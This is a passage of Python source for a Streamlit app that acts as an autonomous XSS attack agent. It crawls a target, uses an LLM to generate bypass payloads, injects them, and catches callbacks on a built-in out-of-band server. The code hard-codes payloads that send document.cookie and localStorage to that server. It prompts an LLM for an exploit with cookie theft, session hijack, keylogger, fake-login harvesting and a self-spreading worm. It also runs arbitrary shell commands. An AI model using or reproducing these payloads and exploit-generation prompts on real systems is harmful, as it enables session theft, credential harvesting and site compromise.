            resp = session.get(target, headers={hname:hval}, timeout=REQ_TIMEOUT)
            if probe in resp.text:
                idx = resp.text.find(probe)
                return hname, hval, resp.status_code, resp.text[max(0,idx-50):idx+100]
        except Exception: pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
        for res in ex.map(_t, test_h.items()):
            if res:
                hname, hval, code, snip = res
                hits.append({"url":target,"param":hname,"payload":hval,
                              "method":"header","status":code,
                              "reflected":True,"escaped":False,"partial":False,
                              "context":f"HTTP header ({hname})","body_snippet":snip,
                              "browser_confirmed":False})
                log(f"Header injection — {hname} reflected", "vuln", term_ph, stats_phs)
                st.session_state.vulns_found += 1
    return hits


def hunt_graphql(target: str, pages: list, session: requests.Session,
                 term_ph, stats_phs) -> list:
    hits = []
    parsed_t = urllib.parse.urlparse(target)
    base = f"{parsed_t.scheme}://{parsed_t.netloc}"
    candidates = [base+p for p in ["/graphql","/api/graphql","/v1/graphql","/gql","/graphiql"]]
    js_eps = [ep for p in pages for ep in p.get("js_endpoints",[])]
    candidates += [ep for ep in js_eps if "graphql" in ep.lower()]
    hdrs = {"Content-Type":"application/json","Accept":"application/json"}
    intro = json.dumps({"query":"{ __schema { types { name } } }"})

    def _t(ep):
        try:
            resp = session.post(ep, data=intro, headers=hdrs, timeout=REQ_TIMEOUT)
            if resp.status_code==200 and "__schema" in resp.text:
                return ep, resp.text
        except Exception: pass
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        for res in ex.map(_t, candidates[:8]):
            if res:
                ep, _ = res
                log(f"GraphQL endpoint: {ep}", "vuln", term_ph, stats_phs)
                for pl in ['<img src=x onerror=alert(1)>','"><script>alert(1)</script>']:
                    payload = json.dumps({"query":'query($x:String){__typename}',"variables":{"x":pl}})
                    try:
                        r2 = session.post(ep, data=payload, headers=hdrs, timeout=REQ_TIMEOUT)
                        if pl in r2.text:
                            hits.append({"url":ep,"param":"GraphQL variables","payload":pl,
                                          "method":"post","status":r2.status_code,
                                          "reflected":True,"escaped":False,"partial":False,
                                          "context":"GraphQL variable reflection",
                                          "body_snippet":r2.text[:300],"browser_confirmed":False,
                                          "severity":"HIGH — GraphQL XSS"})
                            st.session_state.vulns_found += 1
                            log(f"GraphQL XSS: {ep}", "vuln", term_ph, stats_phs)
                            break
                    except Exception: pass
    return hits


# ══════════════════════════════════════════════════════════════════════════════
# AI: PAYLOAD GENERATION
# ══════════════════════════════════════════════════════════════════════════════
def ai_generate_payloads(client, target, user_payload, infra, plan,
                         dom_sinks, template_engine, pages, oob_url: str="") -> list:
    ctx_blocks = []
    for p in pages[:4]:
        blk = f"URL: {p['url']}\n"
        if p.get("params"): blk += f"  GET params: {p['params']}\n"
        for fm in p.get("forms",[])[:2]:
            blk += f"  Form {fm['method'].upper()} → {fm['action']} fields={[x['name'] for x in fm['fields']]}\n"
        if p.get("dom_sinks"):
            blk += "  DOM sinks:\n"+"".join(f"    {s[:80]}\n" for s in p["dom_sinks"][:3])
        if p.get("inline_js"): blk += f"  Inline JS:\n{p['inline_js'][:300]}\n"
        blk += f"  HTML:\n{p['html'][:500]}\n"
        ctx_blocks.append(blk)

    waf = infra.get("waf","")
    oob_note = f"\nOOB SERVER: {oob_url} — include exfil payloads using fetch/img to this URL" if oob_url else ""

    prompt = f"""Elite XSS researcher. Authorized pentest. Generate 32 precision payloads for {target}.

GOAL: {user_payload}
WAF: {waf or 'none'} — bypass: {plan.get('waf_bypass_strategy','')}
CSP: {infra.get('csp','NONE')} | bypasses: {infra.get('csp_bypasses',[])}
TECH: {infra.get('tech',[])} | ENGINE: {template_engine or 'unknown'}
DOM SINKS: {', '.join(dom_sinks[:5]) if dom_sinks else 'none'}{oob_note}

PAGE CONTEXT:
{chr(10).join(ctx_blocks)[:3000]}

Generate 32 payloads across these tiers:
TIER 1 — Exact context (break out of detected quote type, escape JS delimiters)
TIER 2 — Modern bypasses: DOM clobbering, import maps, trusted types bypass, Angular/Vue/React CSTI
TIER 3 — Mutation XSS: <listing>, <select><option>, <table><td>, <math> parser tricks
TIER 4 — WAF bypass: atob(), Function constructor, String.fromCharCode, no-paren alert`1`, unicode
TIER 5 — Stored survivors: fullwidth unicode ＜script＞, double-encode %253C, null byte
TIER 6 — HTML-only: visible defacement, phishing overlay, clickjacking
TIER 7 — OOB/blind: fetch to OOB server with cookie/localStorage exfil
TIER 8 — Second-order: payloads designed to persist and fire later

Output ONLY a JSON array of 32 strings. No markdown."""

    try:
        resp = client.chat.completions.create(
            model=MODEL, messages=[{"role":"user","content":prompt}],
            max_tokens=2000, temperature=0.7)
        text = re.sub(r"```[a-z]*\n?|```","",resp.choices[0].message.content.strip()).strip()
        m = re.search(r"\[.*\]", text, re.DOTALL)
        if m:
            parsed = json.loads(m.group())
            if isinstance(parsed, list) and len(parsed) >= 5:
                return list(dict.fromkeys(
                    plan.get("top_payloads",[]) + [str(p) for p in parsed] + BASE_PAYLOADS
                ))
    except Exception: pass
    return list(dict.fromkeys(plan.get("top_payloads",[]) + BASE_PAYLOADS))


# ══════════════════════════════════════════════════════════════════════════════
# AI: EXPLOIT & REPORT
# ══════════════════════════════════════════════════════════════════════════════
def ai_write_exploit(client, findings: list, target: str, blind_url: str, oob_url: str) -> str:
    if not findings: return ""
    confirmed = [f for f in findings if f.get("browser_confirmed")]
    best = confirmed[0] if confirmed else findings[0]
    fsum = json.dumps([{
        "url":f["url"],"param":f["param"],"payload":f["payload"],
        "context":f.get("context",""),"method":f["method"],
        "confirmed":f.get("browser_confirmed",False),
        "html_changed":f.get("html_changed",False),
    } for f in findings[:8]], indent=2)

    prompt = f"""Write a complete Python exploit for this authorized pentest.

Target: {target}
Findings:
{fsum}
Best finding: URL={best['url']} param={best['param']} method={best['method']} payload={best['payload']}
OOB server: {oob_url or blind_url or 'none'}

Include these modules:
1. verify() — confirm via HTTP + HTML response check
2. steal_cookies() — inject fetch to OOB with document.cookie + localStorage
3. session_hijack() — use stolen cookie for authenticated requests
4. html_defacement() — inject persistent visible HTML overlay
5. keylogger() — inject keypress listener exfiling to OOB
6. credential_harvest() — inject fake login form overlay
7. stored_worm() — payload that re-injects itself (if stored vuln)
8. payload_variants() — 10 WAF bypass variants
9. mass_inject() — sweep all vulnerable params across all pages

Use: requests, argparse, http.server, base64, threading
Output ONLY raw Python. No markdown."""

    try:
        resp = client.chat.completions.create(
            model=MODEL, messages=[{"role":"user","content":prompt}],
            max_tokens=2500, temperature=0.05)
        return re.sub(r"```python\n?|```","",resp.choices[0].message.content.strip()).strip()
    except Exception as e:
        return f"# Error: {e}"


def ai_full_report(client, findings, pages, target, dom_sinks,
                   infra, template_engine, pm_handlers, advanced_hits) -> str:
    surface = {
        "pages":len(pages),"forms":sum(len(p["forms"]) for p in pages),
        "url_params":sum(len(p["params"]) for p in pages),
        "dom_sinks":len(dom_sinks),"waf":infra.get("waf","none"),
        "csp":infra.get("csp","NONE"),"csp_bypasses":infra.get("csp_bypasses",[]),
        "cors_vuln":infra.get("cors_vuln","none"),
        "cookie_issues":infra.get("cookie_issues",[]),
        "tech":infra.get("tech",[]),"vuln_libs":infra.get("vuln_libs",[]),
        "template_engine":template_engine or "none",
        "spa_pages":sum(1 for p in pages if p.get("spa_rendered")),
    }
    all_findings = findings + advanced_hits

    if all_findings:
        fsum = json.dumps([{
            "url":f["url"],"param":f["param"],"payload":f["payload"],
            "method":f["method"],"context":f.get("context",""),
            "browser_confirmed":f.get("browser_confirmed",False),
            "html_changed":f.get("html_changed",False),
            "severity":f.get("severity","HIGH"),
            "snippet":f.get("body_snippet","")[:200],
        } for f in all_findings[:12]], indent=2)
        prompt = f"""Senior pentester. Comprehensive security report.

Target: {target}
Findings ({len(all_findings)}):
{fsum}
Attack surface: {json.dumps(surface, indent=2)}
DOM sinks: {chr(10).join(dom_sinks[:10])}

Sections:
## Executive Summary (risk rating, business impact)
## Confirmed Vulnerabilities (CVSS, URL, param, context, payload, HTML mutation proof, curl PoC)
## Modern Attack Surface (DOM clobbering, import maps, trusted types, SPA-specific vectors)
## Attack Chains (XSS→session hijack, XSS→credential harvest, CORS→data theft, stored worm)
## CSP & Defense Analysis (bypasses available)
## Remediation (priority-ordered, code examples)
## Immediate Commands (copy-paste curl/Python)"""
    else:
        prompt = f"""Senior pentester. No confirmations. Zero-day hunting guide.

Target: {target}
Surface: {json.dumps(surface, indent=2)}
DOM sinks: {chr(10).join(dom_sinks[:10])}

Sections:
## Attack Surface Assessment
## Why Testing Found Nothing (SPA? Auth? WAF? JSON-only?)
## DOM XSS Zero-Day Hunt (specific sinks, sources, payloads)
## Modern Vectors (DOM clobbering, import maps, trusted types bypass, second-order)
## Blind XSS Plan
## Manual Commands"""

    try:
        resp = client.chat.completions.create(
            model=MODEL, messages=[{"role":"user","content":prompt}],
            max_tokens=MAX_TOKENS, temperature=0.2)
        return resp.choices[0].message.content
    except Exception as e:
        return f"Error: {e}"


# ══════════════════════════════════════════════════════════════════════════════
# AGENT ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════════════════
def run_agent(target, user_payload, max_depth, blind_url,
              cookie_str, login_url, login_user, login_pass,
              term_ph, stats_phs):
    client = get_client()
    L = lambda msg, kind="info": log(msg, kind, term_ph, stats_phs)

    L(f"Target  : {target}")
    L(f"Payload : {user_payload}")
    L(f"Depth   : {max_depth}")
    if blind_url: L(f"Blind   : {blind_url}", "blind")
    L("━" * 50)

    # ── OOB server ──────────────────────────────────────────────────────────
    _start_oob_server()
    oob = _oob_url()
    L(f"OOB callback server: {oob}", "oob")
    _poll_oob_hits()

    # ── Build session (with cookies if provided) ─────────────────────────────
    session = _make_session(cookie_str)

    # ── Auth ────────────────────────────────────────────────────────────────
    if login_url.strip() or login_user.strip():
        L("━" * 50)
        L("PHASE 0.0 — AUTHENTICATION", "auth")
        phase08_auth(target, session, login_url, login_user, login_pass, term_ph, stats_phs)

    # Extract session cookies for Playwright
    def _session_cookies_for_pw():
        parsed = urllib.parse.urlparse(target)
        return [{"name":c.name,"value":c.value,
                 "domain":parsed.netloc,"path":"/"}
                for c in session.cookies]
    session_cookies = _session_cookies_for_pw()

    # ── Phase 0 — Infrastructure ─────────────────────────────────────────────
    L("━" * 50)
    L("PHASE 0 — INFRASTRUCTURE RECON", "infra")
    infra = phase0_infrastructure(target, session, term_ph, stats_phs)
    st.session_state.infra = infra

    # ── Phase 0.5 — AI Attack Planning ──────────────────────────────────────
    L("━" * 50)
    L("PHASE 0.5 — AI ATTACK PLANNING", "plan")
    plan = phase05_plan(client, target, infra, user_payload, term_ph, stats_phs)
    st.session_state.attack_plan = plan.get("attack_summary","")

    # ── Phase 1 — Crawl (HTTP + JS spider in parallel) ───────────────────────
    L("━" * 50)
    L("PHASE 1 — DUAL CRAWL (HTTP fast + Playwright JS spider)", "info")

    http_pages = []
    spa_pages  = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        f_http = ex.submit(http_crawl, target, max_depth,
                           infra.get("robots_disallowed",[]), session, term_ph, stats_phs)
        f_spa  = ex.submit(playwright_spider, target,
                           min(MAX_PAGES//3, 15), session, term_ph, stats_phs)
        http_pages = f_http.result()
        spa_pages  = f_spa.result()

    # Merge, dedup by URL
    seen_urls = set()
    pages = []
    for p in http_pages + spa_pages:
        if p["url"] not in seen_urls:
            seen_urls.add(p["url"])
            pages.append(p)

    st.session_state.pages_crawled = len(pages)
    spa_count = sum(1 for p in pages if p.get("spa_rendered"))
    L(f"Crawl done — {len(pages)} unique pages ({spa_count} JS-rendered) | "
      f"{sum(len(p['forms']) for p in pages)} forms | "
      f"{sum(len(p['params']) for p in pages)} params", "ok")

    all_sinks = list(dict.fromkeys(s for p in pages for s in p.get("dom_sinks",[])))[:20]
    st.session_state.dom_sinks = all_sinks
    if all_sinks:
        L(f"DOM sinks: {len(all_sinks)}", "dom")
        for s in all_sinks[:4]: L(f"  {s[:100]}", "dom")

    pm_handlers = [h for p in pages for h in p.get("postmessage_handlers",[])]
    unsafe_pm   = [h for h in pm_handlers if h.get("no_origin_check")]
    if unsafe_pm:
        L(f"⚠️  {len(unsafe_pm)} postMessage handlers without origin check!", "warn")

    eng, ssti_payloads = _detect_template_engine(pages)
    if eng: L(f"Template engine: {eng} — SSTI payloads queued", "warn")

    # ── Phase 2 — AI Payload Generation ─────────────────────────────────────
    L("━" * 50)
    L("PHASE 2 — AI PAYLOAD GENERATION", "ai")
    payloads = ai_generate_payloads(
        client, target, user_payload, infra, plan, all_sinks, eng, pages, oob)
    payloads += ssti_payloads[:5]

    # OOB blind payloads
    oob_payloads = [
        f'<img src=x onerror=fetch("{oob}?c="+document.cookie)>',
        f'"><img src=x onerror=fetch("{oob}?c="+document.cookie)>',
        f"'><script>fetch('{oob}?d='+btoa(document.cookie+' | '+localStorage.length))</script>",
        f'<svg onload=new Image().src="{oob}?dom="+btoa(document.body.innerHTML.slice(0,300))>',
        f'<img src=x onerror=fetch("{oob}",{{method:"POST",body:document.cookie}})>',
    ]
    if blind_url:
        oob_payloads += [
            f'<img src=x onerror=fetch("{blind_url}?c="+document.cookie)>',
            f"'><script>fetch('{blind_url}?d='+btoa(document.cookie))</script>",
        ]
    payloads = list(dict.fromkeys(oob_payloads + payloads))

    L(f"Generated {len(payloads)} payloads (AI-ranked, OOB-enabled)", "ai")
    for i, pl in enumerate(payloads[:5], 1):
        L(f"  [{i}] {pl[:85]}", "cmd")

    focus_fields = plan.get("focus_fields",[])
    if focus_fields: L(f"Priority fields: {focus_fields}", "plan")

    # ── Phase 3 — Reflected XSS + HTML Mutation (parallel) ───────────────────
    L("━" * 50)
    L("PHASE 3 — REFLECTED XSS + HTML MUTATION (parallel)", "info")
    all_findings = []
    for page in pages:
        _poll_oob_hits()
        hits = test_page_parallel(page, payloads, focus_fields,
                                  session, term_ph, stats_phs,
                                  session_cookies=session_cookies)
        all_findings.extend(hits)
    confirmed_3  = [f for f in all_findings if f.get("browser_confirmed")]
    html_changed = [f for f in all_findings if f.get("html_changed")]
    L(f"Tested {st.session_state.points_found} pts | "
      f"{len(confirmed_3)} JS-confirmed | {len(html_changed)} HTML-mutated | "
      f"{len(all_findings)-len(confirmed_3)} reflected-only", "ok")

    # ── Phase 3.5 — Stored XSS (parallel, CSRF-aware) ────────────────────────
    L("━" * 50)
    L("PHASE 3.5 — STORED XSS (parallel + CSRF token extraction)", "hunt")
    stored_hits = hunt_stored_xss(pages, payloads, session,
                                  term_ph, stats_phs, session_cookies)
    if stored_hits: L(f"  {len(stored_hits)} stored XSS candidate(s)!", "vuln")
    else:           L("  No stored XSS found", "info")
    all_findings += stored_hits

    # ── Phase 4 — Advanced hunting (parallel) ────────────────────────────────
    L("━" * 50)
    L("PHASE 4 — ADVANCED ZERO-DAY HUNTING", "hunt")
    skip = plan.get("skip_phases",[])
    advanced_hits = []

    def _run_hunts():
        results = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
            fs = {
                ex.submit(hunt_cache_poisoning, target, session, term_ph, stats_phs): "cache",
                ex.submit(hunt_cors_xss, target, infra, term_ph, stats_phs): "cors",
                ex.submit(hunt_jsonp, pages, session, term_ph, stats_phs): "jsonp",
                ex.submit(hunt_header_injection, target, session, term_ph, stats_phs): "header",
            }
            if "graphql" not in skip:
                fs[ex.submit(hunt_graphql, target, pages, session, term_ph, stats_phs)] = "graphql"
            for f in concurrent.futures.as_completed(fs):
                try: results.extend(f.result())
                except Exception: pass
        return results

    L("  › Cache poisoning / CORS / JSONP / header injection (parallel)...", "hunt")
    advanced_hits += _run_hunts()

    L("  › Mutation XSS (mXSS sanitizer bypass)...", "hunt")
    advanced_hits += hunt_mutation_xss(pages, plan, session, term_ph, stats_phs, session_cookies)

    L("  › DOM XSS via Playwright (hash/search sources)...", "hunt")
    advanced_hits += hunt_dom_xss(pages, session_cookies, term_ph, stats_phs)

    if advanced_hits: L(f"Advanced: {len(advanced_hits)} additional finding(s)", "ok")
    else:             L("Advanced: no additional vectors confirmed", "info")

    all_findings += advanced_hits
    st.session_state.findings = all_findings

    # ── Phase 7 — Second-order XSS ───────────────────────────────────────────
    if all_findings or stored_hits:
        L("━" * 50)
        L("PHASE 7 — SECOND-ORDER XSS SWEEP", "second")
        second_hits = phase7_second_order(pages, session, term_ph, stats_phs, session_cookies)
        if second_hits:
            L(f"  🎯 {len(second_hits)} second-order execution(s) confirmed!", "vuln")
            st.session_state.second_order_hits = second_hits
            all_findings += second_hits
            st.session_state.findings = all_findings

    # ── Check OOB hits ────────────────────────────────────────────────────────
    time.sleep(1)
    _poll_oob_hits()
    if st.session_state.oob_hits:
        L(f"📡 {len(st.session_state.oob_hits)} OOB callback(s) received!", "oob")
        for hit in st.session_state.oob_hits[:3]:
            L(f"  📡 [{hit['time']}] {hit['type']} {hit['path'][:80]}", "oob")

    total_confirmed = len([f for f in all_findings if f.get("browser_confirmed")])
    total_html      = len([f for f in all_findings if f.get("html_changed")])
    L(f"Total: {len(all_findings)} findings | {total_confirmed} JS-confirmed | {total_html} HTML-mutated", "ok")

    # ── Phase 5 — Exploit ────────────────────────────────────────────────────
    if all_findings:
        L("━" * 50)
        L("PHASE 5 — EXPLOIT SCRIPT GENERATION", "ai")
        exploit = ai_write_exploit(client, all_findings, target, blind_url, oob)
        st.session_state.exploit_code = exploit
        L("Exploit script ready (see Exploit Code tab)", "ok")

    # ── Phase 6 — Report ─────────────────────────────────────────────────────
    L("━" * 50)
    L("PHASE 6 — AI SECURITY REPORT", "ai")
    report = ai_full_report(client, all_findings, pages, target, all_sinks,
                            infra, eng, pm_handlers, advanced_hits)
    st.session_state.report = report
    L("Report complete", "ok")
    L("━" * 22 + " DONE " + "━" * 22, "ok")
    st.session_state.done    = True
    st.session_state.running = False


# ═══════════════════════════════════ UI ════════════════════════════════════════
st.markdown("""
<style>
[data-testid="stAppViewContainer"] { background: #0f111a; }
[data-testid="stHeader"] { background: #0f111a; }
</style>
""", unsafe_allow_html=True)

st.title("🕷️ XSS Autonomous Agent")
st.caption("Authorized use only — only test systems you own or have explicit written permission to test.")

with st.container(border=True):
    st.subheader("🎯 Mission")
    c1, c2 = st.columns([3,1])
    with c1:
        target_input = st.text_input("Target URL",
                                      value=st.session_state._last_target,
                                      placeholder="https://your-test-site.com")
    with c2:
        depth_input = st.slider("Crawl depth", 1, 5, int(st.session_state._last_depth))

    payload_input = st.text_area(
        "What to inject",
        value=st.session_state._last_payload,
        placeholder='<script>alert("owned")</script>  or  <img src=x onerror=fetch("https://myserver/?c="+document.cookie)>',
        height=68,
    )

    with st.expander("🔑 Auth & Session (optional — for authenticated testing)"):
        ac1, ac2 = st.columns(2)
        with ac1:
            cookie_input = st.text_input(
                "Session cookies",
                value=st.session_state._last_cookies,
                placeholder="sessionid=abc123; csrftoken=xyz",
                help="Paste your session cookies here to test authenticated pages",
                type="password",
            )
            login_url_input = st.text_input(
                "Login URL (auto-login)",
                value=st.session_state._last_login_url,
                placeholder="https://target.com/login",
            )
        with ac2:
            login_user_input = st.text_input(
                "Username",
                value=st.session_state._last_login_user,
                placeholder="admin",
            )
            login_pass_input = st.text_input(
                "Password",
                value=st.session_state._last_login_pass,
                placeholder="password123",
                type="password",
            )

    blind_input = st.text_input(
        "External blind XSS callback URL (optional — built-in OOB server auto-starts)",
        value=st.session_state._last_blind_url,
        placeholder="https://your-webhook.site/callback",
        help="Leave blank to use the built-in OOB server",
    )

    ca, cb = st.columns([2,1])
    with ca:
        start_btn = st.button("🚀 Launch Agent", type="primary",
                               use_container_width=True,
                               disabled=st.session_state.running)
    with cb:
        if st.button("🗑️ Reset", use_container_width=True):
            for k, v in defaults.items():
                st.session_state[k] = v
            st.rerun()

# Stats
sc    = st.columns(5)
s_phs = tuple(col.empty() for col in sc)
_render_stats(*s_phs)

# Attack plan banner
if st.session_state.attack_plan:
    st.info(f"📋 **Attack Plan:** {st.session_state.attack_plan}")

# OOB hits banner
if st.session_state.oob_hits:
    st.error(f"📡 **{len(st.session_state.oob_hits)} OOB CALLBACK(S) RECEIVED** — blind XSS confirmed!")
    with st.expander("View OOB callbacks"):
        for hit in st.session_state.oob_hits:
            st.code(json.dumps(hit, indent=2))

# Terminal
term_ph = st.empty()
_draw_terminal(term_ph)

# Tabs
tab1, tab2, tab3, tab4, tab5, tab6 = st.tabs([
    "📊 Findings & Report", "💻 Exploit Code",
    "🏗️ Infrastructure", "📡 OOB Callbacks",
    "🔬 DOM Sinks", "🖥️ Manual Terminal"
])

with tab1:
    if st.session_state.findings:
        confirmed = [f for f in st.session_state.findings if f.get("browser_confirmed")]
        html_mut  = [f for f in st.session_state.findings if f.get("html_changed") and not f.get("browser_confirmed")]
        reflected = [f for f in st.session_state.findings if not f.get("browser_confirmed") and not f.get("html_changed")]
        if confirmed:  st.error(f"🎯 {len(confirmed)} CONFIRMED — JS executed in Chromium")
        if html_mut:   st.warning(f"🔀 {len(html_mut)} HTML MUTATED — page structure changed")
        if reflected:  st.info(f"⚠️ {len(reflected)} reflected (unescaped) — not browser-verified")

        for i, f in enumerate(st.session_state.findings, 1):
            ok       = f.get("browser_confirmed",False)
            html_chg = f.get("html_changed",False)
            badge    = "🎯 EXECUTED" if ok else ("🔀 HTML MUTATED" if html_chg else "⚠️ REFLECTED")
            label    = f"#{i} {badge} [{f.get('context','?')}] {f['url'][:55]} — {f['param']}"
            with st.expander(label, expanded=(i==1)):
                if ok:
                    st.success("✅ JavaScript executed"
                               + (f' — dialog: `{f["dialog_msg"]}`' if f.get("dialog_msg") else "")
                               + (f' — injected: `{str(f.get("injected_element",""))[:60]}`' if f.get("injected_element") else ""))
                elif html_chg:
                    st.warning(f"🔀 HTML MUTATED — {f.get('dom_diff','')}")
                else:
                    st.warning("Reflected unescaped — not browser-confirmed")
                if f.get("severity"): st.info(f["severity"])
                st.code(f["payload"], language="html")
                c1,c2 = st.columns(2)
                with c1:
                    st.markdown(f"**URL:** `{f['url']}`  \n**Param:** `{f['param']}`  \n**Method:** `{f['method'].upper()}`")
                with c2:
                    st.markdown(f"**Context:** `{f.get('context','?')}`  \n**HTTP:** `{f.get('status','?')}`  \n**HTML changed:** `{f.get('html_changed',False)}`")
                if f.get("body_snippet"):
                    st.code(f["body_snippet"][:500], language="html")
                if f.get("screenshot_before") and f.get("screenshot_after"):
                    sc1,sc2 = st.columns(2)
                    with sc1:
                        st.caption("Before injection")
                        st.image(f["screenshot_before"], use_container_width=True)
                    with sc2:
                        st.caption("After injection")
                        st.image(f["screenshot_after"], use_container_width=True)
                elif f.get("screenshot"):
                    st.image(f["screenshot"], caption="Proof screenshot", use_container_width=True)

    if st.session_state.get("report"):
        st.divider()
        st.subheader("📝 AI Security Report")
        st.markdown(st.session_state.report)
    if not st.session_state.done and not st.session_state.running:
        st.info("Launch the agent to see findings.")

with tab2:
    if st.session_state.exploit_code:
        st.subheader("🔧 AI-Generated Exploit Script")
        st.code(st.session_state.exploit_code, language="python")
        st.download_button("⬇️ exploit.py", st.session_state.exploit_code,
                           file_name="exploit.py", mime="text/plain")
    else:
        st.info("Exploit script appears after vulnerabilities are found.")

with tab3:
    infra = st.session_state.get("infra",{})
    if infra:
        st.subheader("🏗️ Infrastructure Fingerprint")
        c1,c2,c3 = st.columns(3)
        c1.metric("WAF",   infra.get("waf") or "None")
        c2.metric("Server",infra.get("server") or "Unknown")
        c3.metric("Tech",  ", ".join(infra.get("tech",[])) or "Unknown")
        if infra.get("ips"):       st.markdown(f"**IPs:** {', '.join(infra['ips'])}")
        if infra.get("csp"):
            st.markdown("**CSP:**"); st.code(infra["csp"])
        if infra.get("csp_bypasses"):
            st.warning("**CSP bypass vectors:**")
            for b in infra["csp_bypasses"]: st.markdown(f"- {b}")
        if infra.get("cors_vuln"):  st.error(f"**CORS:** {infra['cors_vuln']}")
        if infra.get("cookie_issues"):
            st.warning("**Cookie issues:**")
            for ci in infra["cookie_issues"]: st.markdown(f"- {ci}")
        if infra.get("header_issues"):
            st.warning("**Header issues:**")
            for hi in infra["header_issues"]: st.markdown(f"- {hi}")
        if infra.get("vuln_libs"):
            st.error("**Vulnerable JS libs:**")
            for lib in infra["vuln_libs"]: st.markdown(f"- {lib}")
        if infra.get("robots_disallowed"):
            st.markdown("**Disallowed paths:**")
            for p in infra["robots_disallowed"]: st.markdown(f"- `{p}`")
        if st.session_state.attack_plan:
            st.divider()
            st.subheader("📋 AI Attack Plan")
            st.info(st.session_state.attack_plan)
    else:
        st.info("Infrastructure data appears after a scan.")

with tab4:
    st.subheader("📡 OOB (Out-of-Band) Callback Server")
    oob_url_display = _oob_url()
    st.info(f"Built-in OOB server listening on port {OOB_PORT}\n\n"
            f"**Callback URL:** `{oob_url_display}`\n\n"
            f"The agent automatically injects payloads that exfiltrate cookies + DOM to this URL. "
            f"Any received callback = blind XSS confirmed.")
    if st.button("🔄 Refresh OOB hits"):
        _poll_oob_hits()
        st.rerun()
    if st.session_state.oob_hits:
        st.error(f"🎯 {len(st.session_state.oob_hits)} OOB callback(s) received!")
        for i, hit in enumerate(st.session_state.oob_hits, 1):
            with st.expander(f"#{i} [{hit['time']}] {hit['type']} {hit['path'][:50]}"):
                st.json(hit)
    else:
        st.info("No OOB callbacks yet. They appear here in real-time when a blind XSS fires.")

with tab5:
    if st.session_state.dom_sinks:
        st.subheader(f"🔬 DOM Sinks ({len(st.session_state.dom_sinks)} found)")
        st.caption("These process user-controllable data — DOM XSS targets.")
        for s in st.session_state.dom_sinks:
            st.code(s, language="javascript")
    else:
        st.info("DOM sinks appear after a scan.")

with tab6:
    st.subheader("Manual Command Runner")
    mc = st.text_input("Command", placeholder="curl -sIL https://target.com")
    if target_input:
        presets = {
            "Headers":    f"curl -sIL {target_input}",
            "CSP":        f"curl -sI {target_input} | grep -i content-security",
            "Cookies":    f"curl -sIL {target_input} | grep -i set-cookie",
            "WAF probe":  f'curl -s "{target_input}?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" -o /dev/null -w "%{{http_code}}"',
            "CORS check": f'curl -sI -H "Origin: https://evil.com" {target_input} | grep -i access-control',
            "Robots":     f"curl -sL {target_input}/robots.txt",
            "DOM dump":   f"curl -sL {target_input} | grep -oP '.{{0,50}}innerHTML.{{0,80}}'",
        }
        pcols = st.columns(len(presets))
        for i, (label, cmd) in enumerate(presets.items()):
            with pcols[i]:
                if st.button(label, use_container_width=True): mc = cmd
    if st.button("▶ Run") and mc.strip():
        with st.spinner("Running..."):
            try:
                r   = subprocess.run(mc, shell=True, capture_output=True, text=True, timeout=30)
                out = (r.stdout + r.stderr).strip() or "(no output)"
            except subprocess.TimeoutExpired:
                out = "[TIMEOUT]"
            except Exception as e:
                out = f"[ERROR] {e}"
        st.code(out, language="bash")

# ── Launch ─────────────────────────────────────────────────────────────────────
if start_btn:
    if not target_input.strip():
        st.warning("Enter a target URL.")
    elif not payload_input.strip():
        st.warning("Enter what you want to inject.")
    else:
        st.session_state.update({
            "_last_target":     target_input.strip(),
            "_last_payload":    payload_input.strip(),
            "_last_depth":      depth_input,
            "_last_blind_url":  blind_input.strip(),
            "_last_cookies":    cookie_input.strip(),
            "_last_login_url":  login_url_input.strip(),
            "_last_login_user": login_user_input.strip(),
            "_last_login_pass": login_pass_input.strip(),
            "running":True,"done":False,
            "log":[],"findings":[],"dom_sinks":[],
            "pages_crawled":0,"points_found":0,"vulns_found":0,
            "exploit_code":"","report":"","waf_detected":"",
            "infra":{},"attack_plan":"","oob_hits":[],"second_order_hits":[],
        })
        st.rerun()

if st.session_state.running and not st.session_state.done:
    run_agent(
        st.session_state._last_target,
        st.session_state._last_payload,
        int(st.session_state._last_depth),
        st.session_state._last_blind_url,
        st.session_state._last_cookies,
        st.session_state._last_login_url,
        st.session_state._last_login_user,
        st.session_state._last_login_pass,
        term_ph, s_phs,
    )
    st.rerun()
